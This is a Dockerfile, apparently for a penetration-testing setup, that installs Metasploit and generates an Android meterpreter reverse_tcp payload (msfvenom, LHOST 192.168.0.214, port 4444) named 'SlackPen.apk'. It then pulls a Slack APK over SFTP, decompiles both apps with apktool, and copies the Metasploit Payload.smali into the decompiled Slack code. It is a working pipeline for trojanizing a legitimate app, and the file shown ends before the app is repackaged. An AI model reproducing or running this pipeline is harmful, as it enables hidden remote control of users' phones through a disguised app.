FROM python:3.7
FROM siutin/ubuntu-rvm

WORKDIR /usr/src/wdir
ADD . /usr/src/wdir

ENV DEBIAN_FRONTEND=noninteractive
RUN sudo apt-get update
RUN sudo ./tzdata_add.sh 

RUN sudo apt-get update && \
     sudo apt-get -y install apt-utils && \
      sudo apt-get -y install sudo && \
       sudo apt-get -y install wget && \
		sudo apt-get -y install openssl && \
		 sudo apt-get -y install curl && \
		  sudo apt-get -y install ssh && \
		   sudo apt-get -y install vim

RUN sudo /bin/bash -l -c '/usr/src/wdir/install-apktool.sh'

RUN sudo /bin/bash -l -c 'sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo ./msfinstall'

RUN sudo /bin/bash -l -c 'msfvenom -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk'

RUN sudo apt-get -y install python3-distutils
RUN sudo curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
RUN sudo python3 get-pip.py
RUN sudo python3 -m pip install pysftp

RUN sudo /bin/bash -l -c 'sudo python3 /usr/src/wdir/P-Scripts/get_file_sftp.py'

RUN sudo apktool d -f -o original Slack.apk
RUN sudo apktool d -f -o payload SlackPen.apk

RUN sudo mkdir /usr/src/wdir/original/smali/com/metasploit/
RUN sudo mkdir /usr/src/wdir/original/smali/com/metasploit/stage/
RUN sudo cp /usr/src/wdir/payload/smali/com/metasploit/stage/Payload.smali /usr/src/wdir/original/smali/com/metasploit/stage

RUN ls -la
